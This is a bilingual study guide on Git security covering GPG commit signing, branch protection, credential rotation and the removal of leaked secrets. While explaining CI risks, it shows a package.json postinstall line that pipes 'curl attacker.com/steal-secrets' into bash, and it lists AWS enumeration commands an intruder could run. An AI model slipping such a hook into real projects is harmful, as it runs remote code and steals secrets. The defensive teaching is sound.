# CREDENTIAL_ROTATION_LOG.md

# Mejor: Mantener log solo localmente o en sistema de secretos
```

##### 8. **Respuesta a Incidente - Rotación Emergencia**

**Si un Secreto es Comprometido**:

```bash
#!/bin/bash
# emergency_credential_rotation.sh

INCIDENT_TIMESTAMP=$(date -Iseconds)
echo "🚨 CREDENTIAL COMPROMISE - Starting emergency rotation at: $INCIDENT_TIMESTAMP"

# 1. Revocar credencial INMEDIATAMENTE
echo "[1/5] Revoking compromised credential..."
# GitHub token: Ir a Settings > Developer settings > Personal access tokens > Delete
# AWS key: AWS Console > Deactivate immediately

# 2. Cambiar en sistemas críticos
echo "[2/5] Updating in critical systems..."
# git config --global user.token "NEW_TOKEN"
# aws configure  # Update keys
# env var updates

# 3. Limpiar del historio de Git
echo "[3/5] Cleaning Git history..."
git filter-repo --replace-text <(echo "old_secret==>REDACTED=")

# 4. Auditar acceso potencial
echo "[4/5] Auditing for potential unauthorized access..."
# git log -p --all | grep -i "auth\|login\|access"
# AWS CloudTrail review
# GCP audit logs review

# 5. Notificar al equipo
echo "[5/5] Notifying team..."
# Email/Chat message about credential compromise and new procedures

# 6. Documentar incidente
echo "Incident logged to: incident_${INCIDENT_TIMESTAMP}.log"
```

---

## 🎯 Key Learnings

**Conceptos Principales Aprendidos**:

1. **Protección de Ramas y Flujos de Trabajo Colaborativos**: Comprendí cómo las reglas de protección de ramas en GitHub previenen cambios no autorizados, garantizan calidad de código mediante PR reviews, y crean un ambiente seguro para desarrollo en equipo. El sistema de CODEOWNERS asigna automáticamente revisores basándose en patrones de propiedad de código.

2. **Seguridad Criptográfica con Firmas GPG**: Aprendí la importancia de firmar commits con GPG para verificar autenticidad e integridad de cambios. La configuración de claves GPG, la generación de firmas digitales y la validación de commits "Verified" en GitHub son prácticas fundamentales de seguridad en desarrollo profesional.

3. **Gestión y Remediación de Secretos**: Descubrí múltiples enfoques para proteger información sensible: prevención mediante `.gitignore`, detección automática con secret scanning, y remediación con herramientas como BFG y git filter-repo. Entendí que la eliminación rápida de secretos comprometidos es crítica.

4. **Rotación de Credenciales como Práctica de Defensa en Profundidad**: Comprendí que cambiar periódicamente credenciales (tokens, SSH keys, GPG keys, contraseñas BD, AWS access keys) limita el impacto de posibles compromisos. Diferentes tipos de credenciales tienen ciclos de rotación diferentes según su criticidad.

5. **Cumplimiento Normativo y Auditoría en Git**: Aprendí cómo registrar y auditar cambios, mantener logs de rotación de credenciales, y responder a incidentes de seguridad. La capacidad de rastrear "quién hizo qué y cuándo" es esencial para cumplimiento normativo y forense digital.

**Habilidades Mejoradas**:

- **Configuración Segura de Repositorios**: Dominar la configuración de reglas de protección de ramas, requisitos de PR, status checks, y políticas de firma obligatoria para mantener integridad del código.

- **Gestión de Claves Criptográficas**: Generación, exportación, importación y rotación de claves GPG y SSH, incluyendo configuración automática de firma en Git y validación en GitHub.

- **Escaneo y Detección de Información Sensible**: Uso de comandos avanzados de Git (`git log -p`, `git rev-list`) y herramientas para identificar patrones de secretos, archivos grandes y cambios sospechosos en el historio.

- **Remediación de Incidentes de Seguridad**: Aplicación de herramientas especializadas (BFG, git filter-repo) para limpiar historio de Git después de compromisos accidentales, incluyendo estrategias de fuerza-push seguro.

- **Automatización de Rotación y Auditoría**: Creación de workflows automatizados con GitHub Actions para recordatorios de rotación, documentación de cambios de credenciales, y logging de auditoría de seguridad.

- **Análisis de Trade-offs de Seguridad**: Evaluación crítica de cómo equilibrar medidas de seguridad estrictas con productividad del equipo, reconociendo que seguridad excesiva puede obstaculizar desarrollo pero insuficiente expone a riesgos.

- **Documentación y Comunicación de Procedimientos**: Capacidad de documentar procedimientos complejos de seguridad de forma clara, incluyendo scripts, procesos paso a paso, y best practices para el equipo.

---

---

## Security Deep Dive Q&A

### 🔐 Commit Signing

#### Why does commit signing matter for supply chain security?

La firma de commits es fundamental para la seguridad de la cadena de suministro de software porque:

- **Autenticidad Verificable**: Proporciona prueba criptográfica de que un commit fue creado por una persona específica con una clave privada específica. Sin esto, cualquiera podría reclamar que creó un commit configurando `user.name` y `user.email`.

- **No Repudio**: El autor del commit no puede negar posteriormente que creó ese cambio específico, ya que la firma es verificable solo con su clave privada.

- **Detección de Compromisos de Cuenta**: Si una cuenta de GitHub es hackeada, los commits realizados sin firmar durante la intrusion pueden ser identificados. Los commits legítimos previos mantendrían sus firmas válidas.

- **Prevención de Contaminación de Repositorio**: En proyectos críticos (librerías de amplio uso, software de seguridad), asegurar que solo desarrolladores autorizados contribuyan código es esencial para prevenir inyección de malware.

- **Cumplimiento Normativo y Auditoría**: Muchas regulaciones (SOC 2, ISO 27001, sectores financieros/militares) requieren capacidad de auditar y verificar quién hizo cambios específicos en código crítico.

- **Defensa contra Attaques de Supply Chain**: Ataques como SolarWinds comprometen librerías populares. Las firmas obligatorias en ramas protegidas previenen que atacantes agreguen código malicioso a menos que comprometan directamente la clave GPG de un maintainer.

#### What attacks does GPG signing prevent?

Las firmas GPG previenen o detectan varios tipos de ataques:

**Ataques que PREVIENE**:

1. **Falsificación de Identidad (Identity Spoofing)**:
   - Ataque: Un atacante configura `git config user.name "Linus Torvalds"` y envía cambios
   - Prevención: Sin la clave GPG de Linus, la firma es falsa
   - Defensa: Los commits requieren firma válida según CODEOWNERS

2. **Acceso no Autorizado a Ramas**:
   - Ataque: Un hacker con acceso a GitHub user.com pero sin SSH key intenta cambios
   - Prevención: Si los commits sin firma son rechazados, no puede contribuir
   - Protección: Rules like "Require signed commits" + "Dismiss stale approvals on push"

3. **Man-in-the-Middle (MITM) Durante Transmisión**:
   - Ataque: Un atacante en la red modifica commits entre cliente y servidor
   - Prevención: La firma inavalida si el contenido es alterado
   - Verificación: `git log --show-signature` verifica integridad

4. **Compromiso Temporal de Cuenta**:
   - Ataque: Hacker obtiene acceso momentáneo a laptop de desarrollador
   - Prevención: Aunque acceda a máquina, sin clave GPG privada no puede firmar commits válidos
   - Limitación: El atacante podría hacer commits sin firma si branch protection no los requiere

**Ataques que DETECTA (pero no previene completamente)**:

1. **Cambios No-Autorizados Post-Compromise**:
   - Detección: Commits sin firma o con firma inválida después de fecha de compromiso conocida
   - Análisis: `git log --show-signature | grep -B 3 "Bad signature"`

2. **Clave Privada Comprometida** (si se detecta pronto):
   - Señal: Commits con firma válida de fecha/ubicación sospechosa
   - Acción: Investigación y rotación de clave

#### How do you verify someone else's signed commits?

**Verificación Manual**:

```bash
# Ver commits con información de firma
git log --show-signature -n 5

# Salida típica:
commit abc1234def567890
gpg: Signature made Sat Feb 14 21:23:29 2026 +0000
gpg:                using RSA key 23D9F3027B8414036743E594601A8AFCCA65E576
gpg: Good signature from "Fernando Cuesta <fernandocuestab@gmail.com>" [ultimate]
Author: Fernando Cuesta <fernandocuestab@gmail.com>
Date:   Sat Feb 14 21:23:29 2026 +0000

    feat: Add feature description

# Ver verificación con más detalle
git log --pretty=fuller --show-signature -n 1

# Verificar solo commits NO firmados (rojo):
git log --oneline --all --decorate | grep -v "gpg: Good"

# Importar clave pública de otra persona para verificar
gpg --keyserver keyserver.ubuntu.com --recv-keys 23D9F3027B8414036743E594601A8AFCCA65E576
git verify-commit abc1234def567890
```

**Verificación en GitHub**:

- Los commits tienen badge "Verified" en verde si la firma es válida
- Hacer click en commit muestra: "This commit was signed with a verified signature using GitHub's verified signature program"
- En Pull Requests, se puede ver qué commits tienen firma válida antes de aprobar

**Confianza en Claves Públicas**:

```bash
# Listar claves públicas locales con nivel de confianza
gpg --list-keys --keyid-format=long

# Ver nivel de confianza de firma (ultimate, full, marginal, unknown)
gpg --list-keys --with-colons

# Firmar la clave pública de alguien (asegurar que es quien dice ser)
gpg --sign-key 23D9F3027B8414036743E594601A8AFCCA65E576

# Verificar cadena de confianza
gpg --list-sigs  # Ver quién ha firmado cada clave

# En contexto de proyecto: requiere key.asc o keyring compartido
gpg --import < team-keys.asc
```

#### What happens if you lose your GPG key?

**Escenario: Pérdida de Clave GPG Privada**

**Impacto Inmediato**:

1. **No puedes firmar commits nuevos** con esa clave
2. **Los commits antiguos permanecen**, pero no puedes crear más con esa identidad
3. **Claves públicas ya distribuidas** aún existen en servidores de claves públicas (permanentes)

**Acciones Correctivas - Con Clave de Respaldo**:

```bash
# Si tienen backup de la clave privada
gpg --import < backup-private-key.gpg
# Restaurada, continúa operación normal
```

**Acciones Correctivas - Sin Backup (Peor Caso)**:

```bash
# 1. Generar nueva clave GPG
gpg --full-generate-key
# RSA 4096, sin expiración o 2 años

# 2. Obtener ID de nueva clave
gpg --list-secret-keys --keyid-format=long
# sec   rsa4096/NEW_KEY_ID_AAAABBBBCCCCDDDD

# 3. Exportar nueva clave pública
gpg --armor --export NEW_KEY_ID_AAAABBBBCCCCDDDD > new-key.asc

# 4. Agregar a GitHub (Settings > SSH and GPG keys > New GPG key)
# Pegar contenido de new-key.asc

# 5. Configurar Git con nueva clave
git config --global user.signingkey NEW_KEY_ID_AAAABBBBCCCCDDDD

# 6. Commits futuros usarán nueva clave
git commit -S -m "feat: Using new GPG key"
```

**Comunicación a Equipo**:

```bash
# Crear actualización en documentación de seguridad
# o notificar a team leads sobre cambio de clave

# En proyectos siguientes, commits tendrán:
# gpg: Good signature from "Fernando Cuesta <...>"
# pero con NUEVO KEY ID

# Commits ANTIGUOS permanecen válidos (eran firmados con clave anterior)
```

**Mitigaciones para Evitar Pérdida**:

```bash
# 1. Backup de clave privada (SEGURO)
gpg --export-secret-keys --armor > private-backup.asc
# Almacenar en: USB encriptado, gestor de contraseñas, bóveda segura
# NUNCA: GitHub, correo, dropbox sin encriptación

# 2. Usar Subkeys (avanzado)
# La clave maestra se guarda segura, subkeys para uso diario
gpg --edit-key NEW_KEY_ID_AAAABBBBCCCCDDDD
# addkey -> seleccionar subkey, sign/certify/auth/encrypt

# 3. Expiración de clave
# En generación: establecer expiración de 2 años
# Antes de expirar, extender validez: gpg --edit-key <keyid>
# Esta previene que claves perdidas/robadas sean válidas indefinidamente

# 4. Certificación Cruzada
# Mantener múltiples claves en dispositivos diferentes
# Firma verificación: si una se compromete, otras aún válidas
```

**Impacto en Historio del Repositorio**:

```bash
# Commits con clave antigua:
git log --show-signature | grep -A 3 "OLD_KEY_ID"
# gpg: Good signature from "Fernando" [ultimate]
# (Permanecerá válido siempre, clave criptográficamente segura)

# Commits con clave nueva:
git log --show-signature | grep -A 3 "NEW_KEY_ID"
# gpg: Good signature from "Fernando" [ultimate]
# (Nuevos commits desde la recuperación)

# Información de transición visible públicamente en historio
```

---

### 🔐 Branch Protection

#### How do protection rules prevent unauthorized changes?

Las reglas de protección de rama funcionan mediante **control de acceso a nivel de Git** y **validación de cambios** antes de permitir push:

**Mecanismo 1: Push Requirement (Rechazo a Nivel Remoto)**:

```
Sin protección:
Usuario → git push origin main → Servidor acepta → Rama actualizada ✓

Con protección (direct push):
Usuario → git push origin main → Servidor rechaza → Error de push ✗
remote: error: GH013: Repository rule violations found for refs/heads/main.
remote: - Changes must be made through a pull request.
```

**Mecanismo 2: Pull Request Requirement (Flujo Forzado)**:

```bash
# El servidor reenruta cambios a través de PR:
git push origin feature/change → Servidor acepta en rama feature ✓
# PR creado → Requiere aprobación → Review gate ✓
# Si OK → Merge a main, sino → Bloqueado ✗
```

**Mecanismo 3: Status Checks (Validación Automática)**:

```
Pull Request creado → GitHub dispara webhooks CI/CD
                   ↓
            Ejecuta tests/linters
                   ↓
            ¿Pasan todos? SI → Check verde ✓
                        NO → Check roja ✗
                   ↓
            Merge bloqueado hasta que pasen ✓
```

**Mecanismo 4: Require Signed Commits**:

```bash
# Commit sin firma:
git commit -m "change"  # Crea commit
git push origin main    # Rechazado
remote: - Commits must have verified signatures.

# Commit firmado:
git commit -S -m "change"  # Con firma GPG
git push origin main       # Acepta (si otros checks OK) ✓
```

**Mecanismo 5: CODEOWNERS + Dismiss Stale Reviews**:

```bash
# Sin protección: Archivo CODEOWNERS es solo informativo
# Con protección: GitHub puede REQUERIR aprobación del propietario

# Además, si nuevo commit es pushed:
Aprobación antigua + Nuevo commit → Aprobación descartada automáticamente
# Fuerza re-revisión de todo el cambio
```

**Bloqueo en Niveles Múltiples**:

```
┌─────────────────────────────────────────────┐
│  Intento: git push origin main              │
└────────────────────┬────────────────────────┘
                     ↓
        ¿Es rama protegida?
        SI → Requiere Pull Request
        ↓
    ¿Existe PR? SI → Continuar validación
               NO → Rechazar
               ↓
    Validaciones (paralelas):
    ├─ ¿Aprobaciones suficientes?
    ├─ ¿Status checks pasados?
    ├─ ¿Commits firmados?
    ├─ ¿Conversaciones resueltas?
    └─ ¿Rama actualizada con base?
               ↓
        ¿Todas OK? SI → Permitir merge ✓
                   NO → Bloquear ✗
```

#### What's the minimum viable set of protections?

**MVP (Minimum Viable Protection) - Para Proyecto Pequeño**:

```yaml
Rama: main

Regla 1: Require Pull Request (CRÍTICA)
  └─ Razón: Evita acceso directo sin revisión
  └─ Configuración:
     - Require PR before merging: YES
     - Min reviews: 1
     - Dismiss stale PR approvals: YES
     - Require CODEOWNERS review: NO (opcional para MVP)

Regla 2: Require Status Checks (RECOMENDADO)
  └─ Razón: Validación automatizada de tests/linting
  └─ Configuración:
     - Require status checks to pass: YES
     - Require branches up-to-date: YES
     - Status required: "Build", "Tests" (CI/CD basic)

Regla 3: Signed Commits (RECOMENDADO)
  └─ Razón: Autenticidad de cambios
  └─ Configuración:
     - Require signed commits: YES

---

Regla 4 (NO en MVP): Restrict force push (NO NECESARIO)
Regla 5 (NO en MVP): Require CODEOWNERS review (SOLO equipos > 5)
Regla 6 (NO en MVP): Dismiss recent reviews when new commits pushed (AVANZADO)
```

**MVP de Ejemplo en GitHub Settings**:

```bash
# URL: https://github.com/[owner]/[repo]/settings/branches

Protection for main:
☑ Require a pull request before merging
  ☑ Require approvals: 1
  ☑ Dismiss stale pull request approvals when new commits are pushed
  ☐ Require review from code owners

☑ Require status checks to pass before merging
  ☑ Require branches to be up to date before merging
  ☑ Status checks that must pass (required)
    ☑ build
    ☑ tests

☑ Require branches to be up to date before merging
☑ Require commits to be signed
☐ Include administrators
```

**Escalamiento Cuando Crece Proyecto**:

```
MVP (1 rama)
    ↓ Agregar más branches críticas
MVP+ (3 ramas: main, develop, release/*)
    ↓ Equipo > 5, agregar CODEOWNERS
MVP+ CODEOWNERS: Require code owner approval
    ↓ Desarrollo internacional, diferentes timezones
CODEOWNERS + Automated assignment
    ↓ Criticidad muy alta (fintech, healthcare)
Full Security: Signed commits + GPG key rotation required
```

#### How do you balance security with emergency fixes?

**Dilema: Security vs. Speed en Emergencias**

**Escenario**:

- Servidor en producción caído
- Tráfico pérdida
- VP ejecutivo pidiendo fix AHORA
- Tu rama main tiene 3 protecciones: PR, approval, status checks
- Esperar revisión = 20 minutos, impacto financiero

**Solución 1: Bypass Automático para Emergencias (NO RECOMENDADO)**

```bash
# ❌ NO HAGAS ESTO
git push origin main --force  # IGNORA PROTECCIONES
# Resultado: Potencial code malware, auditoría fallada

# ❌ Desactivar protecciones temporalmente
# GitHub Settings > Branches > Remove protection while fixing
# Resultado: Ventana abierta para otros cambios malignos durante crisis
```

**Solución 2: Bypass Autorizado para Administradores (MEJOR)**

```bash
# En GitHub Settings > Branch Protection:
☑ Include administrators
  # Por defecto, administradores pueden hacer push forzado
  # Cambiar a:
☑ Restrict who can push to matching branches:
    → Solo permitir admin específicos (CTO, lead SRE)

# En emergencia:
# CTO ejecuta: git push origin HEAD:main --force
# Registrado en audit log automáticamente
# Acción: Notificar equipo, documentar en incident report
```

**Solución 3: Hotfix Branch + Fast-Track Review (RECOMENDADO)**

```bash
# Flujo en emergencia (reduce fricción pero mantiene seguridad):
1. Crear branch hotfix desde main
   git checkout main
   git pull origin main
   git checkout -b hotfix/critical-db-connection

2. Fix el problema
   # Editar archivos
   # Commit: git commit -S -m "hotfix: Restore DB connection"

3. Push a rama hotfix (no protegida)
   git push origin hotfix/critical-db-connection

4. Crear PR (GitHub creará automáticamente)
   # PR: hotfix/critical-db-connection → main

5. Notificar team en Slack/Teams
   "CRITICAL FIX PR OPEN - DB CONNECTION ISSUE"

6. Fast-track review
   # Lead/manager revisa en < 5 min
   # Aprueba PR

7. Auto-merge (si configurado)
   # O merge manual inmediato

8. Revert status check si está fallando por timing
   # "Fix in production, validating in background"
```

**Solución 4: Tiered Protections por Criticidad**

```yaml
# main (MÁXIMA PROTECCIÓN)
Branch: main
- Require PR + 2 approvals
- Require status checks (all)
- Require signed commits
- Status checks DEBEN pasar
→ SLA: Cambios en 1-2 horas

# hotfix (PROTECCIÓN MEDIA - para fixes de emergencia)
Branch: hotfix/*
- Require PR + 1 approval (CTO solo)
- Require status checks (critical only)
- Require signed commits
- Status checks pueden ser waived por CTO
→ SLA: Cambios en 15-30 minutos

# develop (PROTECCIÓN BAJA - desarrollo)
Branch: develop
- Require PR + 1 approval (cualquier senior)
- Opcional: status checks
→ SLA: Cambios en 30 min - 2 horas
```

**Solución 5: Automated Remediation Post-Emergency**

```bash
#!/bin/bash
# Proceso DESPUÉS que emergencia se resuelve

# Archivo: post-incident-security-review.sh

INCIDENT_PR=$1  # número de PR del hotfix

echo "🚨 EMERGENCY FIX COMPLETED - SECURITY REVIEW"
echo "================================================"

# 1. Validar que cambio es correcto
echo "[1/4] Reviewing hotfix changes..."
git log main..hotfix/critical-db-connection --oneline

# 2. Ejecutar suite completa de tests
echo "[2/4] Running full test suite..."
npm test -- --coverage

# 3. Audit del cambio a largo plazo
echo "[3/4] Scheduling post-incident review..."
# Agregar tarea al backlog para revisión profunda en 24h

# 4. Documentar bypass en security log
echo "[4/4] Documenting in security log..."
cat >> SECURITY_INCIDENTS.md << EOF
## Incident: $(date)
- Type: Emergency bypass of PR requirement
- Context: Production DB connection failure
- Resolution: Hotfix branch with fast-track 1-approval review
- Audit: Admin approved by $APPROVER at $(date)
- Action: Full review scheduled for $(date +%Y-%m-%d) + 1 day
EOF

echo "✅ Incident documented and review scheduled"
git add SECURITY_INCIDENTS.md
git commit -S -m "docs: Security incident log - emergency bypass on $(date +%Y-%m-%d)"

# Enviar notificación a security team para revisión
# curl -X POST https://slack-webhook/... -d '{"text":"...security audit needed..."}'
```

**Mejores Prácticas - Equilibrio**:

```
┌──────────────────────────────────────────────────────┐
│  PRINCIPIOS DE BALANCE SECURITY↔SPEED                │
├──────────────────────────────────────────────────────┤
│                                                      │
│ 1. PREVENCIÓN ES MEJOR QUE EMERGENCIA               │
│    → Buenas prácticas de desarrollo = menos crisis  │
│    → Monitoreo proactivo + alertas tempranas        │
│                                                      │
│ 2. RAMAS SEPARADAS PARA DIFERENTES NIVELES          │
│    → main: máxima protección                        │
│    → hotfix: protección media pero rápida           │
│    → develop: protección flexible                   │
│                                                      │
│ 3. DOCUMENTAR TODO BYPASS/EMERGENCIA                │
│    → Aumenta seguridad retrospectiva                │
│    → Permite auditoría y análisis de raíces         │
│    → Facilita mejoras futuras                       │
│                                                      │
│ 4. AUTOMATIZACIÓN DE VALIDACIONES                   │
│    → Tests rápidos = puedan correr en PR inmediato │
│    → No obligar espera mientras CI corre            │
│    → Parallelizar checks cuando sea posible         │
│                                                      │
│ 5. EMPOWERMENT CON RESPONSABILIDAD                  │
│    → Admins pueden bypassear SI documentan          │
│    → Shift left: desarrolladores catch issues early │
│    → Trust pero verify: auditoría post-acción       │
│                                                      │
└──────────────────────────────────────────────────────┘
```

#### What are the limitations of branch protection?

**Limitaciones de Branch Protection en GitHub**:

**1. Limitación: Solo protege rama especifica**

```bash
# Protección: main ✓ (no se puede push directo)
git push origin main
# ❌ rejected - branch protection

# NO Protección: develop ✗ (push directo funciona)
git push origin develop
# ✅ accepted - sin protección

# Usuario malintencionado:
# pushea a develop → espera a merge manual a main
```

**Mitigación**:

```bash
# Proteger TODAS las ramas importantes
# GitHub Settings > Branches > Add rule
# Patterns: main, develop, release/*, stagng/*
```

---

**2. Limitación: Local commits no están protegidos**

```bash
# El usuario puede hacer revert local ANTES de push
git log --oneline
# Mostrar: abc1234 feat: Malicious code hidden
#         def5678 feat: Legitimate change

git revert abc1234  # Crear nuevo commit que deshace mal cambio
# ❌ Branch protection NO detecta esto

# Alternativa: usuario hace commit destructivo después
git reset --hard HEAD~2  # Borrar 2 commits locales
git push origin develop --force  # Force push si no protegido

# ¿Qué pasó con el commit malicioso?
# Fue en la máquina local, nunca llegó al repo
```

**Mitigación**:

```bash
# Pre-commit hooks (local, en máquina dev)
# Ejecutan antes de permitir commit

# Archivo: .git/hooks/pre-commit
#!/bin/bash
git diff --cached | grep -i "password\|aws_key\|secret" && {
  echo "❌ Secret detected in commit - BLOCKED"
  exit 1
}
exit 0

# Fuerza que todos los devs tengan hooks
# Repo/setup-git-hooks.sh → ejecutado en onboarding
```

---

**3. Limitación: Admin siempre puede bypassear**

```bash
# Even con todas protecciones:
# Si administrador quiere, puede hacer:

git push origin main --force  # Force push (bypassea PR requirement)
# ✅ Funciona (admin puede)

# No hay "super-protección" contra admin malicious
# Porque: alguien necesita poder hacer cambios de emergencia
```

**Mitigación**:

```bash
# Auditoría exhaustiva
# GitHub Settings > Audit log
# Registra: quién, qué, cuándo, desde dónde

# También:
# - Limitar número de admins (2-3 personas)
# - Requerir 2 admins para ciertas acciones críticas
# - Monitoreo de force-pushes (alertas)
```

---

**4. Limitación: No protege contra compromiso de cuenta**

```bash
# Escenario: Hacker compromete clave SSH de desarrollador A

# Hacker hace:
git clone github.com:empresa/repo.git
git checkout -b feature/backdoor
# Agrega código malicioso
git commit -S -m "feat: Optimización"
git push origin feature/backdoor

# Luego:
# - Crea PR desde hacker's device
# - Hacker aprueba el PR (si tiene permisos)
# - Merge a main

# ¿Branch protection ayudó?
# Parcialmente: si requiere 2+ aprobaciones, es más difícil
# Pero si dev A es el único senior, puede auto-aprobar

# Firma GPG ayuda:
# - Pero hacker TIENE la clave SSH (compromiso full)
# - Si tiene clave SSH probablemente TAMBIÉN tiene clave GPG
```

**Mitigación**:

```bash
# Multi-factor Authentication (MFA) en GitHub
# + Regular key rotation (90 días)
# + Monitor for unusual activity (GitHub Advanced Security)
# + Require multiple approvals (2+ reviewers)
# + CODEOWNERS approval (distributed responsibility)
```

---

**5. Limitación: Status checks pueden ejecutar código no-confiable**

```bash
# Escenario: Repositorio público con CI/CD

# Hacker hace PR con código malicioso
# Status check: npm test
# Github Action ejecuta: npm install (instala dependencias del package.json)

# En package.json, hacker agregó:
{
  "scripts": {
    "postinstall": "curl attacker.com/steal-secrets | bash"
  }
}

# GitHub Actions ejecuta el script malicioso
# ❌ Branch protection NO previene esto
```

**Mitigación**:

```bash
# - Revisar package.json / requirements.txt ANTES de tests
# - Usar contenedores con permisos restrictos
# - Sandboxing de CI/CD (no acceso a secrets en PRs públicas)
# - GitHub Secrets: no accesibles en forks
```

---

**6. Limitación: Problema de cambios requieren múltiples PRs**

```bash
# Feature requiere cambios en varios archivos críticos
# Cada cambio es en rama diferente:
# - api-changes
# - frontend-changes
# - database-migration
# - docs-update

# Flujo normal:
PR1 (api) → wait for review → wait for approval → merge
PR2 (frontend) → wait for review → wait for approval → merge
PR3 (migration) → creado ANTES de PR1 merge? Conflictos
...

# Con branch protection + requisitos de approvals
# Cliente/feature tarda 3-5 días (1-2 aproval/review por PR)

# Alternativa: Monolithic PR con TODO
# ❌ Pero es enorme, difícil reviewar
```

**Mitigación**:

```bash
# - Agrupar en feature branch con sub-PRs (draft PRs)
# - Usar dependabot para automático
# - SLA claros para reviews (24h máximo)
# - Auto-approve from trusted sources
```

---

**7. Limitación: False negatives en status checks**

```bash
# Status check puede ser:
# 1. Flaky (falla ocasionalmente sin razón)
# 2. Mal configurado (always passes)
# 3. No cubre edge cases

# Ejemplo de flaky test:
describe("API response time", () => {
  it("should respond within 100ms", async () => {
    const start = Date.now();
    await api.call();
    expect(Date.now() - start).toBeLessThan(100);  # Falla en red lenta
  });
});

# En dev laptop: pasa ✓ (red rápida)
# En GitHub Actions máquina compartida: puede fallar aleatorio ✗

# Resultado: PR bloqueado aunque código sea válido
```

**Mitigación**:

```bash
# - Usar timeout razonables basados en P95, no picos
# - Re-run flaky tests 3 veces, pass si 2/3 ok
# - Monitoring de status check reliability
# - Documentar por qué test falla (no es bug de código)
```

---

**Resumen: Branch Protection NO es Silver Bullet**

```
Branch Protection PREVIENE:        Branch Protection NO Previene:
✓ Direct push sin PR               ✗ Compromiso de dev's keys
✓ Merge sin aprobación             ✗ Rogue admin bypassing
✓ Push sin status checks            ✗ Supply chain attack
✓ Commits sin firma (si requiere)   ✗ Insider threat malicioso
✓ Cambios en branches protegidas    ✗ Local commits antes de push
                                    ✗ Vulnerabilidades en deps
                                    ✗ Logical issues (mal código)
```

---

### 🔐 Secret Management

#### Why is removing secrets from history insufficient?

**Problema: Secretos en Historio de Git Persisten**

**Escenario Típico**:

```bash
# 1. Developer accidentalmente commitea:
echo "AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE123456" > .env
git add .env
git commit -m "Add env config"
git push origin main

# 2. Repositorio ahora tiene el secreto en historio:
git log --all --oneline | head -5
# ab12345 Add env config  ← TIENE SECRETO

# 3. Manager/CI descubre el problema:
git log -p | grep -i AWS_SECRET
# Encuentra el commit con la clave expuesta

# 4. Developer corre git filter-repo para limpiar
git filter-repo --replace-text <(echo "AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE123456==>REDACTED")
git push --force

# 5. Historio amanecer "limpio":
git log -p | grep -i AWS_SECRET
# ¿NO encuentraada? ✓ PERO...
```

**¿POR QUÉ LIMPIAR HISTORIO ES INSUFICIENTE?**

**Razón 1: Múltiples Copias del Repositorio**

```bash
# GitHub tiene backups (aunque no públicos)
# Clones anteriores están en máquinas de devs:
~/Documents/proyectos/repo/.git/objects/...  # Contiene secretos aún!

# Reflog local:
git reflog
# Shows: ab12345 Add env config

# Otros servers (mirrors, backups):
git clone --mirror https://github.com/user/repo.git
# El mirror TAMBIÉN tiene la historia completa

# Malicious fork:
# Otro usuario hizo fork ANTES de limpieza
# Su fork aún contiene toda la historia

# Resultado: Secreto VIVE en múltiples lugares
```

**Razón 2: Secreto Y Pasó Utilizado (Terceros)**

```bash
# GitHub Actions: Secret fue expuesto en 2026-02-14 10:00 AM

# Entre 2026-02-14 10:00 y 2026-02-14 10:45 (45 minutos):
# ¿Quién tuvo acceso al secreto?

1. Cualquiera que clonó repo durante esos 45 min
2. Cualquiera que hizo git clone en máquina compartida
3. Cualquier Script/webhook que buscó en historio
4. GitHub Copilot (si está conectado) - pudo indexar
5. Dependabot / bots que acceden a repositorios
6. Usuarios con acceso a logs de GitHub Actions

# Si el secreto era AWS key:
# En esos 45 minutos, alguien pudo hacer requests AWS:
aws s3 ls --no-verify-ssl  # Enumerar buckets
aws ec2 describe-instances  # Ver instancias
aws dynamodb scan           # Leer datos

# Limpieza del historio NO revierte daño ya hecho
# ❌ No detiene AWS requests en progreso con clave expuesta
```

**Razón 3: Terceros Ya Vieron El Secreto**

```bash
# Si el repositorio público estaba con el secreto:

1. Scanners automáticos (TruffleHog, GitRob, etc.)
   - Escanean continuamente GitHub por secretos
   - Encontraron clave en 5-15 minutos
   - Registraron en base de datos "known secrets"

2. Atacantes manual/herramientas
   - Buscan específicamente en repos públicos
   - "password", "API_KEY", "secret" patterns
   - Clave ya compartida en foros/canales de hacking

3. Proveedores notificadores (secretsafe.io, etc.)
   - Algunos proveedores monitorean GitHub automáticamente
   - Notifican si detectan sus propias claves (AWS, GCP, etc.)
   - Pero clave ya fue comprada/intercambiada antes

# Limpieza del hitorio: El secreto YA fut compartido
```

**Razón 4: Falta de Rotación Posterior**

```bash
# Escenario:
# 1. Secreto expuesto en historio
# 2. Limpiamos el historio de Git (git filter-repo)
# 3. ¿Problema resuelto?
#
# NO ❌ porque:

# Credencial sigue siendo VÁLIDA en el sistema original
# Si era AWS key:
  - AWS key sigue siendo válida INDEFINIDAMENTE
  - Alguien que tenga la clave puede usarla ahora, mañana, en 50 años
  - Limpieza de Git = irrelevante a este punto

# Solución incompleta:
Limpieza de Git ✓ (eliminó evidencia de dónde salió)
PERO
Rotación de credencial ✗ (no fue hecha)
RESULTADO: Secreto sigue siendo amenaza

# La amenaza real NO es que esté en Git
# La amenaza es que la credencial sigue siendo VÁLIDA
```

---

#### What's your secret rotation strategy after exposure?

**Plan Integral de Respuesta a Exposición de Secretos**

**Diagrama de Timeline**:

```
T=0 min:      Detecta exposición
              ↓
T=5 min:      ACCIÓN CRÍTICA: Revocar credencial
              ↓
T=30 min:     Limpiar historio de Git
              ↓
T=1 hora:     Regenerar credencial
              ↓
T=2 horas:    Auditar acceso durante exposición
              ↓
T=24 horas:   Post-incident review y mejoras
```

**PASO 1: REVOCACIÓN INMEDIATA (T+0 a T+10 min)**

```bash
# Tipo 1: GitHub Personal Access Token

# Ir a: GitHub Settings > Developer settings > Personal access tokens
# Hacer click: Delete en el token comprometido

# Alternativa CLI:
gh auth revoke --scopes repo,read:org

# Resultado: Token INVALIDO INMEDIATAMENTE
# Cualquier request con el token falla: 401 Unauthorized
# ✓ CRÍTICO: Hecho primero
```

```bash
# Tipo 2: AWS Access Key

# AWS Console > IAM > Users > [User] > Security credentials
# Hacer click: Deactivate en la access key

# Alternativa CLI:
aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE \
                          --status Inactive --user-name dev-user

# Resultado: Key desactivada, No se puede usar
# ✓ CRÍTICO: Paraliza acceso malicioso

# IMPORTANTE: NO ELIMINAR YET (necesario para post-mortem)
```

```bash
# Tipo 3: SSH Private Key (si fue comprometida)

# GitHub Settings > SSH and GPG keys
# Eliminar la clave SSH comprometida

# Resultado: Conexión SSH con key compromet falla
# ✓ Contribuye a revocación, pero menos crítico que token
```

